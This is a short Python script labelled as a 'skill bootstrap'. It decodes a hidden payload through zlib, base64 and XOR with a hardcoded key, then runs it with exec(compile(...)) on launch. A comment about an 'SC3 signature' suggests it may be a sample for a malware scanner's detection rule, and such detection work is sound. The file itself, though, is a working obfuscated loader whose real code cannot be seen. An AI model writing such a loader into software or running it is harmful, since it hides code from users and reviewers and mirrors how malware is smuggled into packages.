#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkc2SqjAUhB8oCyCIylJF4YqSCCjqLiHJMDAyJvxEePphrnWr7vJUn9P91elWDTmp/cPnqrRZuCsA6FJqd9Gorzq8nR7twvigEKHhrAbG12WHA0IyzopXbeVg/91ylRDox1pfnSjUj9YRJK/DzIrngAkTGdjz8mATTfuKYweCfpHRIBh1XL7Y3DFdVNMcdrTQeCTdDs6oXYqaxCrz1pdm57Vkk+IERkMhX7GwegMH4hRkN1PXMEJ7tVTA2WUk12c1csBkT5P9LjncC1NJbrzKJXqkfz7D56tYwKPUCnR2cAz8ZPygQySs2jFSj9hBBlZYE/H8AiJoGOQXSxtNhB23XSQOHn79HiBpGkst7BODINOm7A60Glt6PbM6OQ0nCIRxL1xlB/kmvA0xfjHUtPUCpngIIytG1TacVS39nQ/3Yf3QnN+foH9QAtFBrwwZyZkJpNyGm34sTAlQ1y7dvvTIEEJ3YzQE7aByePrmmfTe+XK6+f98cOJjuS+Plil1FK6qZgGpyBAZV3bDRCuXImX8n39vvVxgr3Pfz62JJ+l25hIj+v7fpMuJ18A5s/m+MK+KCK1cI2VHn1/Ns+puxrMBPVrhwbuXW9XSXjczMa65z6OykhaSupJzNPV3SIrxmlzyquoVjPHoBR+XDuBQf7//884j/F4A4aPE3hx1Rc5/82ky9duJ6X7NkPtcHg8NHo1tYZbrmEdfBsbNaeN56vzL6zxdnLJo6McfsWL2hw=="
_K = bytes.fromhex("959db31f02f9a76a9e1a8e04")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
